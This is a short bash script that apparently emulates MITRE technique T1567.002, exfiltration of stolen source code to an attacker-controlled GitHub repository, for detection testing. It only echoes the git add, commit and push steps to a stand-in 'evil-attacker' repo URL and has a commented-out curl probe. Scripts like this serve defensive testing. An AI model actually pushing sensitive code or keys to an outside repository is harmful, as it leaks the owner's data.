#!/bin/bash
# Technique: T1567.002
# Name: Exfiltration to Code Repository (GitHub/GitLab)
# Description: Pushing sensitive code/keys to a private repo controlled by attacker.

echo "[*] EXECUTING ATOMIC SMUGGLER (Git Push)..."

REPO_URL="https://github.com/evil-attacker/stolen-code.git"
STOLEN_FILE="source_code.tar.gz"

echo "[>] Simulating: git add $STOLEN_FILE"
echo "[>] Simulating: git commit -m 'backup'"
echo "[>] Simulating: git push $REPO_URL master"

# Actual network test (Safe)
# curl -I $REPO_URL
echo "[*] Git Traffic Pattern Generated."
